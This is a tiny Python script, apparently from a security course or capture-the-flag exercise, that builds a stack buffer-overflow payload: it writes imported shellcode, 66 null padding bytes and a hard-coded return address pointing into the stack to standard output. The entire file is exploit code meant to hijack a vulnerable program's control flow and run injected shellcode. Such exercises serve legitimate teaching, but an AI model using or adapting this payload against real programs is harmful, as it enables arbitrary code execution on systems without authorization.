#!/usr/bin/env python3

import sys
from shellcode import shellcode
sys.stdout.buffer.write(shellcode + b'\x00'* 66+ b'\x60\xb0\xf6\xff\xff\x7f\x00\x00')
